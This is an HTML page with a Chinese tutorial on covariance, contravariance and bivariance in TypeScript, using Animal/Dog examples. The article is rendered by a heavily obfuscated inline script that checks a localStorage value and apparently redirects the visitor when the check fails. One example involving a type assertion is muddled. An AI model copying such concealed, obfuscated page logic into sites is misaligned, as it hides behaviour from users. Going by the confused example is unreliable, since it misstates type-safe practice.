<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x2cbe6e=_0x11f5;function _0x2440(){var s=["fCkYk3XIW6DSW6ZdK8oNWQ8HjG","omoNrmoZFCkOkmoTWPpdVa","ECkeWQRdHsNdII/dTSkQW6O","e29xCCo3DCogW75Zl0n1Aa","mdBcRSoPWP7cR1RcG8o2W60","WRdcQmoBWQxcJY4t","W53cLmkcWR7cH8kVWQldVLBdJa","u2hcLrGjW6CUW7/dJG0","tY8SkgtcRmk5q8oppmkcW7yS","x8kCgGrx","W53cSCo7DrvvmL0","hSoyxeyCcq7dGSktmSoSimoa","p0BcSCogEutdQmofW6FdSG","WOpcRSoiWQZcNt49BSop","r8kDhqDDaHxcTmkAe8obaCoGe8o7uSkxW7r7WQOiWRZcIxFcO8kH","BSk3cmkdBSkznG","oNtcHLPgvfpcSq","p2ycWQJcSG9GtSox","C3RdJWZcI2Sor8k3smoYbG","Ds/dL8oylGxdSSon","dLTbWPXdpCo8o3tdLW","W4NdLYRcGIbhWOuj","sSkTnCkXWPrBW6jdWRDL","WOddQSkHjIjSgNycW6S","WOFdRCkRivamgKq5W6ueWRO","scldScpdMxBdKCkDkYC","p8o5WRqDiCkmC8keW5i","W4bAW4JcUZdcSCkpWQBdQJ5bW5aR","W6/cTSkrWR3cSGRcTeK","W6ZcT8ofW5xdJ0xdQgJcIxFcRSo5ia"];return(_0x2440=function(){return s})()}function _0x11f5(t,s){var c=_0x2440();return(_0x11f5=function(s,n){var a=c[s-=473];void 0===_0x11f5.hFGTKZ&&(_0x11f5.lnFCwT=function(s,n){var a,l=[],t=0,c="";for(s=(s=>{for(var n,a,l="",t="",c=0,o=0;a=s.charAt(o++);~a&&(n=c%4?64*n+a:a,c++%4)&&(l+=String.fromCharCode(255&n>>(-2*c&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var e=0,p=l.length;e<p;e++)t+="%"+("00"+l.charCodeAt(e).toString(16)).slice(-2);return decodeURIComponent(t)})(s),o=0;o<256;o++)l[o]=o;for(o=0;o<256;o++)t=(t+l[o]+n.charCodeAt(o%n.length))%256,a=l[o],l[o]=l[t],l[t]=a;for(var o=0,t=0,e=0;e<s.length;e++)a=l[o=(o+1)%256],l[o]=l[t=(t+l[o])%256],l[t]=a,c+=String.fromCharCode(s.charCodeAt(e)^l[(l[o]+l[t])%256]);return c},t=arguments,_0x11f5.hFGTKZ=!0);var s=s+c[0],l=t[s];return l?a=l:(void 0===_0x11f5.MHyCTC&&(_0x11f5.MHyCTC=!0),a=_0x11f5.lnFCwT(a,n),t[s]=a),a})(t,s)}if((()=>{for(var s=_0x11f5,n=_0x2440();;)try{if(515956==-parseInt(s(495,"fvuq"))*(parseInt(s(489,"TXSn"))/2)+-parseInt(s(491,"CyRa"))/3*(-parseInt(s(501,"Pm)!"))/4)+parseInt(s(497,"tO)b"))/5*(parseInt(s(480,"Ce7t"))/6)+parseInt(s(494,"gZ^4"))/7*(parseInt(s(476,"U09G"))/8)+-parseInt(s(477,"a3n]"))/9+parseInt(s(493,"sZFm"))/10+parseInt(s(502,"*rRR"))/11*(parseInt(s(488,"I*30"))/12))break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x2cbe6e(484,"I1zU")](_0x2cbe6e(482,"Q510"))!=_0x2cbe6e(478,"Ce7t"))throw window[_0x2cbe6e(479,"sZFm")][_0x2cbe6e(474,"Q510")](_0x2cbe6e(483,"Ce7t")),Error();document.title="typescript 协变",document.getElementById("article").innerHTML='<div><p>在 TypeScript 中，<strong>协变</strong>  （Covariance）和<strong>逆变</strong>  （Contravariance）是类型系统中两个重要的概念，它们描述了类型之间如何相互关联，特别是在处理复杂类型（如函数、数组、泛型等）时。理解协变和逆变对于掌握 TypeScript 的类型推断和类型兼容性至关重要。</p>\n<hr>\n<h3><strong>协变（Covariance）</strong></h3>\n<h4><strong>定义</strong></h4>\n<p>协变是指当一种类型 <code>T</code> 是另一种类型 <code>S</code> 的子类型时，对于某个类型构造器 <code>C&lt;_&gt;</code>，<code>C&lt;T&gt;</code> 也是 <code>C&lt;S&gt;</code> 的子类型。简而言之，协变保持了类型之间的子类型关系。</p>\n<h4><strong>在 TypeScript 中的表现</strong></h4>\n<p>在 TypeScript 中，协变通常出现在<strong>返回值类型</strong>  和<strong>数组/元组的只读访问</strong>  中。</p>\n<ul>\n<li><strong>函数返回值类型</strong>  ：如果函数 <code>f</code> 的返回类型是 <code>T</code>，而 <code>T</code> 是 <code>S</code> 的子类型，那么 <code>f</code> 可以被赋值给返回类型为 <code>S</code> 的函数变量。</li>\n<li><strong>数组/元组（只读）</strong>  ：当你只读取数组或元组的元素时，TypeScript 会表现出协变行为。</li>\n</ul>\n<h4><strong>示例</strong></h4>\n<pre><code class="language-typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {\n  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;\n  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span></span>) {\n    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;\n  }\n}\n\n<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {\n  <span class="hljs-title function_">bark</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Woof!&quot;</span>);\n  }\n}\n\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">getAnimal</span>(<span class="hljs-params"></span>): <span class="hljs-title class_">Animal</span> {\n  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>(<span class="hljs-string">&quot;Generic Animal&quot;</span>);\n}\n\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">getDog</span>(<span class="hljs-params"></span>): <span class="hljs-title class_">Dog</span> {\n  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;Buddy&quot;</span>);\n}\n\n<span class="hljs-keyword">let</span> <span class="hljs-attr">animal</span>: <span class="hljs-title class_">Animal</span> = <span class="hljs-title function_">getDog</span>(); <span class="hljs-comment">// 协变：Dog 是 Animal 的子类型</span>\nanimal.<span class="hljs-property">name</span>; <span class="hljs-comment">// 可以访问 name 属性</span>\n<span class="hljs-comment">// animal.bark(); // 错误：Animal 类型没有 bark 方法</span>\n</code></pre>\n<p>在这个例子中，<code>Dog</code> 是 <code>Animal</code> 的子类型，因此返回 <code>Dog</code> 的函数可以被赋值给返回 <code>Animal</code> 的函数变量。</p>\n<hr>\n<h3><strong>逆变（Contravariance）</strong></h3>\n<h4><strong>定义</strong></h4>\n<p>逆变是指当一种类型 <code>T</code> 是另一种类型 <code>S</code> 的子类型时，对于某个类型构造器 <code>C&lt;_&gt;</code>，<code>C&lt;S&gt;</code> 是 <code>C&lt;T&gt;</code> 的子类型。简而言之，逆变反转了类型之间的子类型关系。</p>\n<h4><strong>在 TypeScript 中的表现</strong></h4>\n<p>在 TypeScript 中，逆变通常出现在<strong>函数参数类型</strong>  中。</p>\n<ul>\n<li><strong>函数参数类型</strong>  ：如果函数 <code>f</code> 接受参数类型为 <code>T</code>，而 <code>S</code> 是 <code>T</code> 的子类型，那么 <code>f</code> 可以被赋值给接受参数类型为 <code>S</code> 的函数变量（但实际上是更严格的，因为 <code>f</code> 可以接受更泛型的参数）。</li>\n</ul>\n<h4><strong>示例</strong></h4>\n<pre><code class="language-typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">AnimalHandler</span> = <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">animal</span>: <span class="hljs-title class_">Animal</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;\n<span class="hljs-keyword">type</span> <span class="hljs-title class_">DogHandler</span> = <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">dog</span>: <span class="hljs-title class_">Dog</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;\n\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleAnimal</span>(<span class="hljs-params"><span class="hljs-attr">handler</span>: <span class="hljs-title class_">AnimalHandler</span></span>) {\n  <span class="hljs-title function_">handler</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>(<span class="hljs-string">&quot;Generic Animal&quot;</span>));\n}\n\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleDog</span>(<span class="hljs-params"><span class="hljs-attr">dog</span>: <span class="hljs-title class_">Dog</span></span>) {\n  dog.<span class="hljs-title function_">bark</span>();\n}\n\n<span class="hljs-keyword">let</span> <span class="hljs-attr">animalHandler</span>: <span class="hljs-title class_">AnimalHandler</span> = handleDog; <span class="hljs-comment">// 错误：不能将 DogHandler 赋值给 AnimalHandler（直接赋值不行）</span>\n\n<span class="hljs-comment">// 但是，通过逆变的概念，我们可以理解为什么在某些情况下需要更严格的类型匹配</span>\n<span class="hljs-comment">// 例如，如果我们有一个函数接受 AnimalHandler，我们不能直接传入一个只处理 Dog 的处理器</span>\n<span class="hljs-comment">// 因为 AnimalHandler 需要能够处理所有 Animal，而 DogHandler 只能处理 Dog</span>\n\n<span class="hljs-comment">// 正确的做法是使用类型兼容性或类型守卫来确保安全</span>\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">safeHandleAnimal</span>(<span class="hljs-params"><span class="hljs-attr">handler</span>: (animal: Animal) =&gt; <span class="hljs-built_in">void</span>, <span class="hljs-attr">animal</span>: <span class="hljs-title class_">Animal</span></span>) {\n  <span class="hljs-keyword">if</span> (animal <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Dog</span>) {\n    <span class="hljs-comment">// 这里可以安全地调用 handleDog，但需要通过类型守卫</span>\n    (handler <span class="hljs-title function_">as</span> (<span class="hljs-attr">dog</span>: <span class="hljs-title class_">Dog</span>) =&gt; <span class="hljs-built_in">void</span>)(animal); <span class="hljs-comment">// 需要显式断言（不推荐，仅用于说明）</span>\n  } <span class="hljs-keyword">else</span> {\n    <span class="hljs-title function_">handler</span>(animal);\n  }\n}\n</code></pre>\n<p><strong>注意</strong>  ：上面的 <code>let animalHandler: AnimalHandler = handleDog;</code> 直接赋值是错误的，因为 <code>handleDog</code> 只能处理 <code>Dog</code> 类型，而不能处理所有 <code>Animal</code> 类型。这展示了逆变在函数参数类型中的严格性。</p>\n<p>然而，在实际使用中，TypeScript 的类型系统通过上下文和类型推断来确保类型安全，而不是直接允许这种不安全的赋值。逆变更多地体现在类型兼容性规则和某些泛型场景下的行为中。</p>\n<hr>\n<h3><strong>协变与逆变的对比</strong></h3>\n<table>\n<thead>\n<tr>\n<th>特性</th>\n<th>协变（Covariance）</th>\n<th>逆变（Contravariance）</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>定义</strong></td>\n<td>子类型关系在类型构造后保持</td>\n<td>子类型关系在类型构造后反转</td>\n</tr>\n<tr>\n<td><strong>常见场景</strong></td>\n<td>函数返回值类型、数组/元组只读访问</td>\n<td>函数参数类型</td>\n</tr>\n<tr>\n<td><strong>TypeScript 中的表现</strong></td>\n<td><code>T</code> 是 <code>S</code> 的子类型 =&gt; <code>C&lt;T&gt;</code> 是 <code>C&lt;S&gt;</code> 的子类型</td>\n<td><code>T</code> 是 <code>S</code> 的子类型 =&gt; <code>C&lt;S&gt;</code> 是 <code>C&lt;T&gt;</code> 的子类型（在函数参数中表现为更严格的类型匹配）</td>\n</tr>\n<tr>\n<td><strong>示例</strong></td>\n<td><code>Dog</code> 是 <code>Animal</code> 的子类型 =&gt; <code>Dog[]</code> 可以赋值给 <code>Animal[]</code>（只读）</td>\n<td><code>AnimalHandler</code> 接受 <code>Animal</code> =&gt; 不能直接赋值一个只接受 <code>Dog</code> 的处理器</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h3><strong>双向协变（Bivariance）</strong></h3>\n<p>在某些特定情况下，如函数参数位置（特别是在方法参数或回调函数中），TypeScript 可能会采用一种更宽松的类型兼容性规则，称为<strong>双向协变</strong>  。这允许在某些情况下，即使函数参数类型不完全匹配，TypeScript 仍然认为它们是兼容的。然而，双向协变可能导致类型不安全的情况，因此需要谨慎使用。</p>\n<hr>\n<h3><strong>总结</strong></h3>\n<ul>\n<li><strong>协变</strong>  和<strong>逆变</strong>  是 TypeScript 类型系统中的重要概念，它们描述了类型之间如何相互关联。</li>\n<li>协变通常出现在函数返回值类型和数组/元组的只读访问中，而逆变通常出现在函数参数类型中。</li>\n<li>理解协变和逆变对于掌握 TypeScript 的类型推断和类型兼容性至关重要。</li>\n<li>在使用协变和逆变时，需要注意类型安全，避免类型不匹配导致的运行时错误。</li>\n</ul>\n</div>'</script></body></html>